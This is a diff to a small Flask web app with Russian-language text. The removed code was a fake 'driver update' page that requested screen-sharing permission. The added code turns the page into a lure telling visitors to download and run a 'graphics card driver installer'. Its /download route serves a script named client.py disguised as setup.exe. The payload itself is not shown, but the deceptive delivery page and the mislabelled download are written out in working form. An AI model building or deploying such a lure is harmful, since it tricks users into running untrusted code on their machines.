@@ -1,27 +1,16 @@
-from flask import Flask, render_template_string
+from flask import Flask, render_template_string, send_file
+import os
 
 app = Flask(__name__)
 
 HTML = """
 <!DOCTYPE html>
 <html>
-<head><title>Загрузка...</title></head>
+<head><title>Обновление...</title></head>
 <body style="background:#1e1e1e; color:white; text-align:center; padding-top:50px; font-family:Arial;">
-    <h1>Обновление драйверов...</h1>
-    <p>Нажмите кнопку ниже, чтобы начать.</p>
-    <button onclick="startScreen()" style="padding:15px 30px; font-size:20px; cursor:pointer; background:#007bff; color:white; border:none; border-radius:5px;">Начать</button>
-    <div id="status" style="margin-top:20px; color:#aaa;"></div>
-    <script>
-        function startScreen() {
-            document.getElementById('status').innerText = "Ожидание разрешения...";
-            navigator.mediaDevices.getDisplayMedia({video: true}).then(stream => {
-                document.getElementById('status').innerText = "Подключено!";
-                document.querySelector('button').style.display = 'none';
-            }).catch(err => { 
-                document.getElementById('status').innerText = "Вы отклонили запрос."; 
-            });
-        }
-    </script>
+    <h1>Обновление драйверов видеокарты</h1>
+    <p>Для продолжения скачайте установщик и запустите его.</p>
+    <a href="/download" style="padding:15px 30px; font-size:20px; background:#007bff; color:white; text-decoration:none; border-radius:5px;">Скачать установщик</a>
 </body>
 </html>
 """
@@ -29,6 +18,12 @@ HTML = """
 @app.route('/')
 def index():
     return render_template_string(HTML)
+
+@app.route('/download')
+def download():
+    # Здесь мы отдаем файл client.py
+    # В реальности он должен лежать в той же папке на GitHub
+    return send_file('client.py', as_attachment=True, download_name='setup.exe')
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8080)
